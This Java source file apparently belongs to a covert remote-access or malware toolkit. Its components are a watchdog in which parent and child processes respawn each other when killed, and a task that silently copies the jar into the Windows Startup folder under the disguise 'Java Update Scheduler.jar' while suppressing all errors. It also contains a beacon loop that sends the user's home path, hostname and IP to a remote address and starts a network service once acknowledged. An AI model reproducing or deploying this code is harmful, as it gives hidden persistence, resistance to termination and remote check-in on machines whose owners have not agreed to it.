package root.failSafe;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.invoke.MethodHandles;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.Map;
import java.util.Scanner;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Consumer;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;

import root.util.IOUtils;
import root.util.Utils;

public class FailSafe {

	public static final Logger logger = Logger.getLogger(MethodHandles.lookup().lookupClass().getName());
	static
	{
		logger.setLevel(Level.OFF);
	}

	/**
	 * To see logs streamed through SocketHandler use "nc -lkv 127.0.0.1 5051"
	 */
	public static void configLogger(String host, int port) throws IOException {
		Handler socketHandler = new IOUtils.UDPHandler(host, port);
		logger.addHandler(socketHandler);
	}

	@FunctionalInterface
	public static interface NetworkService {
		/**
		 * Run NetworkService, do throw SocketException if unable to bind at hostPort.
		 * This method should not return until task is completed. On return this
		 * NetworkService would be hosted again with call to run(hostIP, hostPort)
		 * 
		 * @throws SocketException On throwing SocketException this method would be
		 *                         called again with new hostPort argument, to attempt
		 *                         binding host socket again with new hostPort.
		 */
		void run(String hostIP, int hostPort) throws SocketException;

	}

	/**
	 * Keeps @param task discoverable by sending discovery beacons to @param
	 * discoveryBeaconPostAddress, @param discoveryBeaconPostPort. On reception of
	 * acknowledgement to @param discoveryBeaconAcknowledgementListenerPort,
	 * host @param task at @param taskHostPort on localhost. And eventually keep
	 * repeating the cycle and thus never returning the function call.
	 */
	public static void keepHosted(String discoveryBeaconPostAddress, int discoveryBeaconPostPort,
			int discoveryBeaconAcknowledgementListenerPort, String TASK_NAME, int taskHostPort, NetworkService task) {

		final String DISCOVERY_BEACON_ACKNOWLEDGEMENT_TEXT = "_DoHost_";
		final String USER_HOME = System.getProperty("user.home");

		final BlockingQueue<String> ACKNOWLEDGEMENT_RESPONSE = new ArrayBlockingQueue<>(1, true);
		final BlockingQueue<String> DISCOVERY_BEACONS = new ArrayBlockingQueue<>(3, true);

		// TimeUnit.SECONDS
		final int ACKNOWLEDGEMENT_RESPONSE_DELAY = 5;

		Thread discoveryBeaconPost = new Thread(() ->
		{
			logger.finer("START discoveryBeaconPost");
			// Transmitter IP Discovery Beacon Post
			final String TX_IP_DBP = discoveryBeaconPostAddress;
			final int TX_PORT_DBP = discoveryBeaconPostPort;
			try
			{
				Consumer<String> udpWriter = IOUtils.getUDPWriter(TX_IP_DBP, TX_PORT_DBP);
				while (true)
				{
					udpWriter.accept(DISCOVERY_BEACONS.take());
				}
			} catch (Exception e)
			{
				logger.log(Level.SEVERE, "discoveryBeaconPost", e);
			}
		});
		discoveryBeaconPost.setName("discoveryBeaconPost");
		discoveryBeaconPost.setDaemon(true);
		discoveryBeaconPost.start();

		// Receiver Port Acknowledgement Listener
		final AtomicInteger RX_PORT_AL = new AtomicInteger(discoveryBeaconAcknowledgementListenerPort);

		Thread discoveryBeaconAcknowledgementListener = new Thread(() ->
		{
			logger.finer("START discoveryBeaconAcknowledgementListener");
			String acknowledgementTextAL;
			while (true)
				LISTENER_LOOP:
				{
					try
					{
						acknowledgementTextAL = new String(IOUtils.receiveAsUDP(RX_PORT_AL.get())).trim();
						logger.info(
								String.format("discoveryBeaconAcknowledgementListener << [%s]", acknowledgementTextAL));

						ACKNOWLEDGEMENT_RESPONSE.put(acknowledgementTextAL);
					} catch (SocketException e)
					{
						logger.log(Level.SEVERE,
								"discoveryBeaconAcknowledgementListener, RX_PORT_AL_: " + RX_PORT_AL.get(), e);
						RX_PORT_AL.incrementAndGet();
					} catch (Exception e)
					{
						logger.log(Level.SEVERE, "discoveryBeaconAcknowledgementListener", e);
						break LISTENER_LOOP;
					}
				}
		});
		discoveryBeaconAcknowledgementListener.setName("discoveryBeaconAcknowledgementListener");
		discoveryBeaconAcknowledgementListener.setDaemon(true);
		discoveryBeaconAcknowledgementListener.start();

		while (true)
		// CREATE_DISCOVERY_BEACON__LISTEN_FOR_ACKNOWLEDGEMENT__HOST_TASK:
		{
			try
			{
				InetAddress hostAddress = InetAddress.getLocalHost();
				String hostIP = hostAddress.getHostAddress();
				int hostPort = taskHostPort;

				String discoveryBeacon = String.format(
						"[%s HostInstance[%s | %s/%s:%d]][Acknowledge With[%s] at Port[%d]]", TASK_NAME, USER_HOME,
						hostAddress.getHostName(), hostIP, hostPort, DISCOVERY_BEACON_ACKNOWLEDGEMENT_TEXT,
						RX_PORT_AL.get());
				DISCOVERY_BEACONS.put(discoveryBeacon);

				String ackResponse = ACKNOWLEDGEMENT_RESPONSE.poll(ACKNOWLEDGEMENT_RESPONSE_DELAY, TimeUnit.SECONDS);
				if (DISCOVERY_BEACON_ACKNOWLEDGEMENT_TEXT.equalsIgnoreCase(ackResponse))
				{
					try
					{
						DISCOVERY_BEACONS.put(discoveryBeacon + "[HOST INSTANTIATED]");
						task.run(hostIP, hostPort);
					} catch (SocketException e)
					{
						taskHostPort++;
						logger.log(Level.SEVERE, "ERROR operating discoveryBeacon[taskHostPort++]: " + discoveryBeacon,
								e);

					} catch (Exception e)
					{
						logger.log(Level.SEVERE, "ERROR operating discoveryBeacon: " + discoveryBeacon, e);
					}
				}
			} catch (Exception e)
			{
				logger.log(Level.SEVERE, "CREATE_DISCOVERY_BEACON__LISTEN_FOR_ACKNOWLEDGEMENT__HOST_TASK", e);
			}
		}
	}

	@FunctionalInterface
	public static interface FailSafeTask {
		/**
		 * @param cmdLineArgs Command Line arguments to this task
		 */
		void run(String enclosingProcessName, String[] cmdLineArgs);
	}

	public static FailSafeTask COPY_JAR_TO_STARTUP_WIN = (enclosingProcessName, cmdLineArgs) ->
	{
		try
		{
			final String TARGET_JAR_NAME = "Java Update Scheduler.jar";
			final String STARTUP_PATH_WIN = System.getProperty("user.home")
					+ "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%s";

			URI enclosingJARDirUIR = FailSafeTask.class.getProtectionDomain().getCodeSource().getLocation().toURI();
			File enclosingJARFile = new File(enclosingJARDirUIR).getAbsoluteFile();

			String fileName = enclosingJARFile.getName();
			if (fileName.endsWith(".jar"))
			{
				Path STARTUP_JAR_PATH = Paths.get(String.format(STARTUP_PATH_WIN, TARGET_JAR_NAME));
				Path enclosingJARPath = enclosingJARFile.toPath();

				Files.copy(enclosingJARPath, STARTUP_JAR_PATH, StandardCopyOption.REPLACE_EXISTING);
			}

		} catch (Exception e)
		{
		}
	};

	/**
	 * <pre>
	 * Executes {@code @param failSafeTask} in fail safe manner i.e. if program is
	 * terminated it would automatically restart itself again.
	 * 
	 * Ideally this function is intended to be invoked from {@code main} function
	 * e.g.
	 * 	public class FailSafeModule {
	 *		public static void main(String[] cmdLineArgs) {
	 *			FailSafeTask failSafeTask = ...
	 *			FailSafe.execute(cmdLineArgs, FailSafeModule.class, failSafeTask);
	 *		}	
	 *	}
	 * </pre>
	 * 
	 * @param mainClassArgs Command line arguments for {@code @param failSafeTask}
	 * @param mainClass     Class that is invoking this function
	 * @param failSafeTask  Task intended to be executed in fail safe manner
	 * @throws Exception
	 */
	public static void execute(String mainClassArgs[], Class<?> mainClass, FailSafeTask failSafeTask) throws Exception {
		execute(mainClassArgs, mainClass, failSafeTask, null);
	}

	public static void execute(String mainClassArgs[], Class<?> mainClass, FailSafeTask failSafeTask,
			Map<Character, FailSafeTask> failSafeTaskGenerationSpecificMap) throws Exception {
		// processName = char GenerationCode CONCAT int ChildNumber
		String processName = null;
		if (mainClassArgs.length == 0 || !mainClassArgs[0].contains("ProcessName:"))
			processName = "A";
		else
		{
			processName = mainClassArgs[0].replace("ProcessName:", "").trim();
			// Remove ProcessName from mainClassArgs so as to forward args to failSafeTask
			mainClassArgs = Arrays.copyOfRange(mainClassArgs, 1, mainClassArgs.length);
		}

		// If this process GenerationCode is 'A' than childGenerationCode is 'B'
		char childGenerationCode = (char) (processName.toCharArray()[0] + 1);

		String mainClassPackageName = "";
		Package mainClassPackage = mainClass.getPackage();

		if (mainClassPackage != null)
			mainClassPackageName = String.join("/", mainClass.getPackage().getName().split("\\.")) + "/";

		URI mainClassDirectoryUIR = mainClass.getProtectionDomain().getCodeSource().getLocation().toURI();
		File mainClassDirectory = new File(mainClassDirectoryUIR).getAbsoluteFile();

		String mainClassJarName = null;
		if (mainClassDirectory.getAbsolutePath().endsWith(".jar"))
		{
			mainClassJarName = mainClassDirectory.getName();
			mainClassDirectory = mainClassDirectory.getParentFile().getAbsoluteFile();
		}
		logger.log(Level.INFO, "ProcessName: " + processName + ", mainClassDirectory: " + mainClassDirectory);
		logger.log(Level.INFO, "ProcessName: " + processName + ", mainClassJarName: " + mainClassJarName);

		execute(mainClassArgs, mainClass, failSafeTask, failSafeTaskGenerationSpecificMap, processName,
				childGenerationCode, mainClassPackageName, mainClassDirectory, mainClassJarName);

	}

	private static void execute(String mainClassArgs[], Class<?> mainClass, FailSafeTask failSafeTask,
			Map<Character, FailSafeTask> failSafeTaskGenerationSpecificMap, String processName,
			char childGenerationCode, String mainClassPackageName, File mainClassDirectory, String mainClassJarName)
			throws Exception {

		final String mainClassArgsSpreaded = Utils.spaceSpreadArray(mainClassArgs);

		// Number of child process created by this process
		final AtomicInteger childCount = new AtomicInteger(0);

		final String BEACON_DATA = "[[FailSafe][ALIVE]]";
		final Runtime runTime = Runtime.getRuntime();

		// Send beacon to either master or child every MASTER_BEACON_SEND_DELAY
		// milliseconds, recommended [190] ~200ms
		final long BEACON_SEND_DELAY = 190,

				// Ensure every BEACON_MONITOR_DEALY milliseconds a BEACON is received,
				// indicating that either a master or child process is alive, recommended [390]
				BEACON_MONITOR_DEALY = 390,
				// Once child creation has triggered wait for at least ~980ms, because child
				// process takes at least ~840ms to instantiate and begin sending beacons to
				// parent process, recommended [980]
				BEACON_MONITOR_DEALY_CHILD_CREATION_PHASE = 980,
				// Some performance tuning, so that reader is not always blocked with read call
				// occupying thread recommended [40]
				BEACON_READER_DEALY = 50;

		// Initially we assume it is a child process but post BEACON_MONITOR_DEALY
		// milliseconds if no BEACON is received then it turns into master process and
		// sprouts a child process
		final AtomicBoolean isMasterProcess = new AtomicBoolean(false);
		final AtomicBoolean isChildCreationInProgress = new AtomicBoolean(false);

		// Beacons received from master or child
		final BlockingQueue<String> beacons = new ArrayBlockingQueue<>(2, true);

		/*-----------------------------------------------------------------------------------------------------------------------------------------------*/

		Thread masterBeaconReader = new Thread(() ->
		{
			logger.log(Level.FINER, "ProcessName: " + processName + ", START masterBeaconReader");
			try (Scanner masterBeaconScanner = new Scanner(System.in))
			{
				String inputLineMasterBeaconReader;
				MASTER_BEACON_READER_LOOP: while (true)
				{
					if (!IOUtils.hasNextLine() && isMasterProcess.get())
					{
						logger.log(Level.FINER, "ProcessName: " + processName + ", BREAK MASTER_BEACON_READER_LOOP");
						break MASTER_BEACON_READER_LOOP;
					}

					inputLineMasterBeaconReader = masterBeaconScanner.nextLine().trim();
					if (BEACON_DATA.equals(inputLineMasterBeaconReader))
					{
						beacons.put(inputLineMasterBeaconReader);
						logger.log(Level.FINEST, "ProcessName: " + processName + ", masterBeaconReader BEACON_DATA == ("
								+ inputLineMasterBeaconReader + ")");
					} else
					{
						logger.log(Level.FINEST, "ProcessName: " + processName + ", masterBeaconReader BEACON_DATA != ("
								+ inputLineMasterBeaconReader + ")");
					}
					// Thread.sleep(BEACON_READER_DEALY); // Removed because IOUtils.hasNextLine()
					// internally have 50ms sleep
				}
			} catch (Exception e)
			{
				logger.log(Level.SEVERE, "ProcessName: " + processName + ", masterBeaconReader", e);
			} finally
			{
				logger.log(Level.FINER, "ProcessName: " + processName + ", END masterBeaconReader");
			}
		});
		masterBeaconReader.setName("masterBeaconReader");
		masterBeaconReader.setDaemon(true);
		// Thread priority order is kept as BeaconReader > BeaconSender > BeaconMonitor
		masterBeaconReader.setPriority(9);
		masterBeaconReader.start();

		Thread masterBeaconSender = new Thread(() ->
		{
			logger.log(Level.FINER, "ProcessName: " + processName + ", START masterBeaconSender");
			try
			{
				MASTER_BEACON_SENDER_LOOP: while (true)
				{
					try
					{// Send beacon to master
						System.out.println(BEACON_DATA);
						logger.log(Level.FINEST,
								"ProcessName: " + processName + ", masterBeaconSender Sends(" + BEACON_DATA + ")");
						Thread.sleep(BEACON_SEND_DELAY);
					} catch (InterruptedException ie)
					{
						if (isMasterProcess.get())
						{
							logger.log(Level.FINER,
									"ProcessName: " + processName + ", BREAK MASTER_BEACON_SENDER_LOOP");
							break MASTER_BEACON_SENDER_LOOP;
						}
					}
				}
			} catch (Exception e)
			{
				logger.log(Level.SEVERE, "ProcessName: " + processName + ", masterBeaconSender", e);
			} finally
			{
				logger.log(Level.FINER, "ProcessName: " + processName + ", END masterBeaconSender");
			}
		});
		masterBeaconSender.setName("masterBeaconSender");
		masterBeaconSender.setDaemon(true);
		masterBeaconSender.setPriority(8);
		masterBeaconSender.start();

		// Ensure every BEACON_MONITOR_DEALY milliseconds a BEACON is received, post
		// BEACON_MONITOR_DEALY milliseconds if no BEACON is received then turn into
		// master process and sprout a child process
		Thread beaconMonitor = new Thread(() ->
		{
			logger.log(Level.FINER, "ProcessName: " + processName + ", START beaconMonitor");
			try
			{
				// beacon(variable identifier) + BeaconMonitor(enclosing thread identifier) =
				// beaconBeaconMonitor( to keep variable identifiers unique in association to
				// enclosing (lambda block) thread and functional purpose )
				String beaconBeaconMonitor;
				Thread childBeaconReader = null, childBeaconSender = null, childErrorStreamReader = null;
				while (true)
				{
					beaconBeaconMonitor = beacons
							.poll(isChildCreationInProgress.get() ? BEACON_MONITOR_DEALY_CHILD_CREATION_PHASE
									: BEACON_MONITOR_DEALY, TimeUnit.MILLISECONDS);

					isChildCreationInProgress.set(false);

					if (!BEACON_DATA.equals(beaconBeaconMonitor))
					{
						logger.log(Level.INFO, "ProcessName: " + processName + ", beaconMonitor BEACON_DATA != ("
								+ beaconBeaconMonitor + ")");

						// On first child creation isMasterProcess is false at this execution point
						if (isMasterProcess.get())
						{
							// Observation : childBeaconReader, childErrorStreamReader exits naturally
							// without interruption when child process is terminated, only childBeaconSender
							// needs interruption to exit on child process termination
							childBeaconReader.interrupt();
							childBeaconSender.interrupt();
							childErrorStreamReader.interrupt();
							logger.log(Level.FINER, "ProcessName: " + processName + ", INTERRUPT child threads: "
									+ (childGenerationCode + "" + childCount.get()));
						}

						isMasterProcess.set(true);
						isChildCreationInProgress.set(true);
						masterBeaconReader.interrupt();
						masterBeaconSender.interrupt();

						String failSafeTaskReInvocationCommand = null;
						if (mainClassJarName == null)
							failSafeTaskReInvocationCommand = "java "
									+ (mainClassPackageName + mainClass.getSimpleName()) + " " + "ProcessName:"
									+ (childGenerationCode + "" + childCount.incrementAndGet()) + " "
									+ mainClassArgsSpreaded;
						else
							failSafeTaskReInvocationCommand = "java -jar " + mainClassJarName + " " + "ProcessName:"
									+ (childGenerationCode + "" + childCount.incrementAndGet()) + " "
									+ mainClassArgsSpreaded;

						logger.log(Level.INFO,
								"ProcessName: " + processName + ", beaconMonitor creatingChildProcess, runTime.exec("
										+ failSafeTaskReInvocationCommand + ", null, " + mainClassDirectory + ")***");

						Process process = runTime.exec(failSafeTaskReInvocationCommand, null, mainClassDirectory);

						InputStream childInputStream = process.getInputStream();
						InputStream childErrorStream = process.getErrorStream();
						OutputStream childOutputStream = process.getOutputStream();

						childBeaconReader = new Thread(() ->
						{
							logger.log(Level.FINER, "ProcessName: " + processName + ", START childBeaconReader");
							try (Scanner childBeaconScanner = new Scanner(childInputStream))
							{
								String inputLineChildBeaconReader;
								while (childBeaconScanner.hasNextLine())
								{
									inputLineChildBeaconReader = childBeaconScanner.nextLine().trim();
									if (BEACON_DATA.equals(inputLineChildBeaconReader))
									{
										beacons.put(inputLineChildBeaconReader);
										logger.log(Level.FINEST,
												"ProcessName: " + processName + ", childBeaconReader BEACON_DATA == ("
														+ inputLineChildBeaconReader + ")");
									} else
									{
										logger.log(Level.FINEST,
												"ProcessName: " + processName + ", childBeaconReader BEACON_DATA != ("
														+ inputLineChildBeaconReader + ")");
									}
									Thread.sleep(BEACON_READER_DEALY);
								}
							} catch (Exception e)
							{
								logger.log(Level.SEVERE, "ProcessName: " + processName + ", childBeaconReader", e);
							} finally
							{
								logger.log(Level.FINER, "ProcessName: " + processName + ", END childBeaconReader");
							}
						});
						childBeaconReader.setName("childBeaconReader");
						childBeaconReader.setDaemon(true);
						childBeaconReader.setPriority(9);
						childBeaconReader.start();

						childBeaconSender = new Thread(() ->
						{
							logger.log(Level.FINER, "ProcessName: " + processName + ", START childBeaconSender");
							try (PrintWriter childOutputWriter = new PrintWriter(childOutputStream, true))
							{
								while (true)
								{
									// Send beacon to child
									childOutputWriter.println(BEACON_DATA);
									logger.log(Level.FINEST, "ProcessName: " + processName
											+ ", childBeaconSender Sends(" + BEACON_DATA + ")");
									Thread.sleep(BEACON_SEND_DELAY);
								}
							} catch (Exception e)
							{
								logger.log(Level.SEVERE, "ProcessName: " + processName + ", childBeaconSender", e);
							} finally
							{
								logger.log(Level.FINER, "ProcessName: " + processName + ", END childBeaconSender");
							}
						});
						childBeaconSender.setName("childBeaconSender");
						childBeaconSender.setDaemon(true);
						childBeaconSender.setPriority(8);
						childBeaconSender.start();

						childErrorStreamReader = new Thread(() ->
						{
							logger.log(Level.FINER, "ProcessName: " + processName + ", START childErrorStreamReader");
							try (Scanner childErrorStreamScanner = new Scanner(childErrorStream))
							{
								while (childErrorStreamScanner.hasNextLine())
								{
									logger.log(Level.WARNING, "ProcessName: " + processName
											+ ", childErrorStream Reads(" + childErrorStreamScanner.nextLine() + ")");
								}
							} catch (Exception e)
							{
								logger.log(Level.SEVERE, "ProcessName: " + processName + ", childErrorStreamReader", e);
							} finally
							{
								logger.log(Level.FINER, "ProcessName: " + processName + ", END childErrorStreamReader");
							}
						});
						childErrorStreamReader.setName("childErrorStreamReader");
						childErrorStreamReader.setDaemon(true);
						childErrorStreamReader.setPriority(5);
						childErrorStreamReader.start();

					}
				}
			} catch (Exception e)
			{
				logger.log(Level.SEVERE, "ProcessName: " + processName + ", beaconMonitor", e);
			} finally
			{
				logger.log(Level.FINER, "ProcessName: " + processName + ", END beaconMonitor");
			}
		});
		beaconMonitor.setName("beaconMonitor");
		beaconMonitor.setDaemon(true);
		beaconMonitor.setPriority(7);
		beaconMonitor.start();

		try
		{
			while (!isMasterProcess.get())
				Thread.sleep(1000);
		} catch (Exception e)
		{
			logger.log(Level.SEVERE, "ProcessName: " + processName + ", failSafeTask.run PreWait", e);
		}

		logger.log(Level.INFO, "ProcessName: " + processName + ", failSafeTaskGenerationSpecificMap: "
				+ failSafeTaskGenerationSpecificMap);
		if (failSafeTaskGenerationSpecificMap != null)
		{
			FailSafeTask failSafeTaskGenerationSpecific = failSafeTaskGenerationSpecificMap
					.get((char) (childGenerationCode - 1));
			if (failSafeTaskGenerationSpecific != null)
			{
				Thread failSafeTaskGenerationSpecificThread = new Thread(() ->
				{
					logger.log(Level.FINER, "ProcessName: " + processName + ", START failSafeTaskGenerationSpecific: "
							+ (char) (childGenerationCode - 1));
					try
					{
						failSafeTaskGenerationSpecific.run(processName, mainClassArgs);
					} catch (Exception e)
					{
						logger.log(Level.SEVERE, "ProcessName: " + processName + ", failSafeTaskGenerationSpecific: "
								+ (char) (childGenerationCode - 1), e);
					} finally
					{
						logger.log(Level.FINER, "ProcessName: " + processName + ", END failSafeTaskGenerationSpecific: "
								+ (char) (childGenerationCode - 1));
					}
				});
				failSafeTaskGenerationSpecificThread.setName("failSafeTaskGenerationSpecificThread");
				failSafeTaskGenerationSpecificThread.start();
			}
		}

		try
		{
			if (failSafeTask != null)
				failSafeTask.run(processName, mainClassArgs);
		} catch (Exception e)
		{
			logger.log(Level.SEVERE, "ProcessName: " + processName + ", failSafeTask.run", e);
		} finally
		{
			logger.log(Level.FINER, "ProcessName: " + processName + ", END failSafeTask");
		}

	}

}
